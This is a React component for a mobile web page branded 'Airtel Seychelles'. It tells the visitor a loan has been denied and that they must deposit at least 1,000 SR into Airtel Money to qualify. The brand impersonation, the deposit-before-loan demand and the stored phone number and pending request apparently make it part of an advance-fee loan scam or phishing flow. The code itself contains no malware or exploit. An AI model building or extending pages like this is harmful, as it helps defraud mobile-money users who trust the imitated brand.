import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';

function AirtelDenied() {
  const navigate = useNavigate();
  const [loanAmount, setLoanAmount] = useState('0');

  // Load the selected loan amount from localStorage on mount
  useEffect(() => {
    const savedAmount = localStorage.getItem('airtelLoanAmount');
    if (savedAmount) {
      setLoanAmount(Number(savedAmount).toLocaleString('en-US'));
    }
  }, []);

  const handleClearAndNavigate = () => {
    // Clear all session data
    localStorage.removeItem('airtelPhone');
    localStorage.removeItem('airtelLoanAmount');
    localStorage.removeItem('airtelPendingRequest');
    navigate('/'); // Go back to login/landing page
  };

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C; /* Airtel Red */
          position: relative;
        }

        /* HEADER */
        .header-section {
          padding: 40px 24px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }

        .menu-btn {
          position: absolute;
          left: 20px;
          top: 20px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
        }

        .header-title {
          font-size: 32px;
          font-weight: 900;
          color: #1a1a1a;
          font-style: italic;
          margin-bottom: 6px;
        }

        .header-subtitle {
          font-size: 14px;
          font-weight: 600;
          color: #1a1a1a;
        }

        /* MAIN CARD */
        .main-card {
          background-color: #ffffff;
          width: 90%;
          max-width: 420px;
          margin: 0 auto;
          border-radius: 24px;
          padding: 32px 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
          position: relative;
          z-index: 10;
        }

        /* DENIED ICON */
        .denied-icon-wrapper {
          display: flex;
          align-items: center;
          justify-content: center;
          width: 80px;
          height: 80px;
          border-radius: 50%;
          background-color: #FEF2F2;
          margin-bottom: 20px;
        }

        /* TYPOGRAPHY */
        .title {
          font-size: 26px;
          font-weight: 800;
          color: #0F172A;
          margin-bottom: 12px;
          text-align: center;
        }

        .subtitle {
          font-size: 15px;
          color: #64748B;
          margin-bottom: 24px;
          text-align: center;
          line-height: 1.5;
        }

        .subtitle strong {
          color: #0F172A;
        }

        /* INACTIVE BOX */
        .inactive-box {
          background-color: #FEF2F2;
          border: 1px solid #FCA5A5;
          border-radius: 16px;
          padding: 24px;
          width: 100%;
          display: flex;
          flex-direction: column;
          align-items: center;
          margin-bottom: 24px;
          text-align: center;
        }

        .inactive-title {
          display: flex;
          align-items: center;
          gap: 8px;
          font-weight: 800;
          color: #DA1C1C;
          font-size: 16px;
          margin-bottom: 12px;
        }

        .inactive-text {
          font-size: 14px;
          color: #4B5563;
          line-height: 1.5;
          margin-bottom: 8px;
        }

        .inactive-amount {
          font-size: 32px;
          font-weight: 900;
          color: #0F172A;
          margin-bottom: 8px;
        }

        /* CHECKLIST BOX */
        .checklist-box {
          background-color: #F8FAFC;
          border: 1px solid #F1F5F9;
          border-radius: 16px;
          padding: 20px;
          width: 100%;
          margin-bottom: 24px;
          display: flex;
          flex-direction: column;
          gap: 12px;
        }

        .checklist-item {
          display: flex;
          align-items: flex-start;
          gap: 12px;
          font-size: 14px;
          color: #475569;
          line-height: 1.4;
        }

        .checkmark {
          color: #16A34A;
          font-weight: bold;
          font-size: 16px;
          line-height: 1;
        }

        /* BUTTONS */
        .primary-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #F87171; /* Soft Coral Red */
          color: #0F172A;
          font-size: 16px;
          font-weight: 800;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          transition: all 0.2s;
          margin-bottom: 16px;
        }

        .primary-btn:active {
          background-color: #EF4444;
        }

        .secondary-btn {
          background: none;
          border: none;
          color: #64748B;
          font-size: 15px;
          font-weight: 600;
          cursor: pointer;
          text-decoration: underline;
          padding: 8px;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 40px 20px 20px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      {/* HEADER */}
      <div className="header-section">
        <button className="menu-btn" onClick={handleClearAndNavigate}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </button>
        <h1 className="header-title">Airtel Seychelles</h1>
        <p className="header-subtitle">Fast loans. Anytime. Anywhere.</p>
      </div>

      {/* MAIN CARD */}
      <div className="main-card">
        
        {/* DENIED ICON */}
        <div className="denied-icon-wrapper">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <circle cx="12" cy="12" r="10"></circle>
            <line x1="12" y1="8" x2="12" y2="12"></line>
            <line x1="12" y1="16" x2="12.01" y2="16"></line>
          </svg>
        </div>

        <h2 className="title">Loan Denied!</h2>
        
        <p className="subtitle">
          Your application for a loan of <strong>{loanAmount} SR</strong> has been denied due to insufficient account activity.
        </p>

        {/* INACTIVE ACCOUNT BOX */}
        <div className="inactive-box">
          <div className="inactive-title">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#DA1C1C" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
              <line x1="2" y1="10" x2="22" y2="10"></line>
            </svg>
            Inactive Airtel Money
          </div>
          <p className="inactive-text">Please deposit at least</p>
          <p className="inactive-amount">1,000 SR</p>
          <p className="inactive-text">
            to your Airtel Money account to activate it and qualify for a new loan.
          </p>
        </div>

        {/* CHECKLIST BOX */}
        <div className="checklist-box">
          <div className="checklist-item">
            <span className="checkmark">✓</span> 
            No funds have been deducted from your account.
          </div>
          <div className="checklist-item">
            <span className="checkmark">✓</span> 
            You can try applying again after 30 days.
          </div>
        </div>

        {/* BUTTONS */}
        <button className="primary-btn" onClick={handleClearAndNavigate}>
          Return to Dashboard
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <line x1="5" y1="12" x2="19" y2="12" />
            <polyline points="12 5 19 12 12 19" />
          </svg>
        </button>

        <button className="secondary-btn" onClick={handleClearAndNavigate}>
          Back to Login
        </button>

      </div>

      {/* BRAND ICONS FOOTER */}
      <div className="brand-icons-footer">
        {/* Icon 1: Airtel Phone */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
          </div>
        </div>
        
        {/* Icon 2: Lock */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>
        </div>

        {/* Icon 3: Airtel Money */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
          </div>
        </div>

        {/* Icon 4: Currency Symbol */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelDenied;